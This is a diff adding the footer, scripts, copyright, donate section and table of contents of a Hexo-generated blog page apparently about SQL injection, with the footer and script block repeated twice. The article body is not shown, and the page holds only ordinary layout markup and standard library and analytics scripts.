+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>John Doe</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2024/01/18/sqli/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;01&#x2F;18&#x2F;sqli&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;01&#x2F;18&#x2F;sqli&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+        
+  <nav class="nav">
+    <a href="/2024/01/18/linux%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%91%BD%E4%BB%A4/"><i class="iconfont iconleft"></i></a>
+    <a href="/2024/01/18/shell%EF%BC%8Cip%E7%AD%89/"><i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#main"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-text">sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yakit"><span class="toc-text">yakit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burpsuite"><span class="toc-text">burpsuite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">基础操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postman%E6%93%8D%E4%BD%9C"><span class="toc-text">postman操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle"><span class="toc-text">oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main"><span class="toc-text">文章目录：</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
